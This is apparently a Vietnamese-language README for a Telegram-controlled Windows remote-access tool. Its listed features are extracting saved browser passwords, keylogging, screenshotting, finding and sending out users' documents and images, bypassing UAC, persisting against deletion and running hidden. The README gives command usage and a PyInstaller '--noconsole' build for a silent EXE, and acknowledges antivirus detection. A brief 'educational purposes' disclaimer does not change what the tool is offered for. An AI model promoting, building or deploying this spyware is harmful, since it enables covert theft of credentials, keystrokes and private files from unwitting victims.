
# 🖥️ Telegram Bot Điều Khiển Windows Từ Xa

Một Telegram bot mạnh mẽ cho phép bạn giám sát và điều khiển máy tính Windows từ xa bằng các lệnh đơn giản qua Telegram. Hỗ trợ nhiều chức năng như lấy mật khẩu trình duyệt, keylogger, chụp màn hình, mở URL, và nhiều hơn nữa.

> ⚠️ **Chỉ hỗ trợ Windows.**

---

## 🚀 Tính Năng

- 🔑 **Trích xuất mật khẩu** từ các trình duyệt phổ biến: Chrome, Edge, Brave, Cốc Cốc.
- ⌨️ **Keylogger:** Ghi lại phím nhấn và gửi log về Telegram.
- 📸 **Chụp màn hình** hiện tại và gửi qua Telegram.
- 🌐 **Mở URL** bằng trình duyệt Chrome.
- 📂 **Tìm kiếm và gửi file quan trọng** (.txt, .docx, .pdf, .jpg, .png).
- 🛑 **Tắt máy / khởi động lại** từ xa.
- 🔓 **Bypass UAC:** Tự động nâng quyền admin.
- 💾 **Tự sao lưu và chống xóa.**
- 🕵️ **Ẩn console**, chạy ngầm.
- 💓 **Heartbeat:** Gửi tín hiệu để kiểm tra bot còn hoạt động.

---

## 🧰 Cài Đặt

### 1. Cài Python và Thư Viện

- Cài Python 3.x từ: https://www.python.org/
- Cài các thư viện cần thiết:
  ```bash
  pip install -r requirements.txt
  ```

### 2. Tạo Bot Telegram

- Dùng [BotFather](https://t.me/BotFather) để tạo bot mới.
- Lấy **BOT_TOKEN** từ BotFather.
- Lấy **CHAT_ID** của bạn hoặc nhóm nhận tin nhắn (có thể dùng [@userinfobot](https://t.me/userinfobot)).

### 3. Cập Nhật Thông Tin Bot

- Mở `main.py` và thay giá trị `BOT_TOKEN` và `CHAT_ID` tương ứng.

### 4. Chạy Bot

```bash
python main.py
```

> 🔒 Bot sẽ tự ẩn console và chạy ngầm khi hoạt động. Có thể bị phát hiện bởi phần mềm antivirus.

---

## 💬 Sử Dụng Bot

Gửi lệnh đến bot trên Telegram:

| Lệnh                | Mô tả                          |
|---------------------|---------------------------------|
| `/lay_pass`         | Lấy mật khẩu từ trình duyệt.    |
| `/lay_keylog`       | Xem log phím nhấn.              |
| `/chup_man_hinh`    | Chụp màn hình.                  |
| `/mo_url <url>`     | Mở URL trên Chrome.             |
| `/lay_file`         | Tìm và gửi file quan trọng.     |
| `/shutdown`         | Tắt máy tính.                   |
| `/restart`          | Khởi động lại máy.              |
| `/help`             | Hiển thị danh sách lệnh.        |

---

## 🛠️ Biên Dịch Thành File EXE

Bạn có thể đóng gói bot thành file EXE:

### 1. Cài đặt PyInstaller

```bash
pip install pyinstaller
```

### 2. Build Script

```bash
pyinstaller --onefile --noconsole main.py
```

- File `.exe` sẽ nằm trong thư mục `dist/`.
- Console sẽ không hiển thị khi chạy.

---

## ⚠️ Tuyên Bố Từ Chối Trách Nhiệm

> Dự án này được tạo ra với mục đích **giáo dục** và **thử nghiệm**. Mọi hành vi sử dụng để xâm nhập hoặc giám sát người khác **mà không có sự cho phép** đều là **bất hợp pháp**. Người dùng chịu hoàn toàn trách nhiệm đối với hành vi sử dụng của mình.

---

## 🤝 Đóng Góp

Bạn muốn cải thiện dự án? Hãy:

- Fork repository
- Commit thay đổi
- Tạo pull request

Mọi đóng góp đều được hoan nghênh.

---

## 📜 Giấy Phép

Phát hành dưới [Giấy Phép MIT](LICENSE).

---
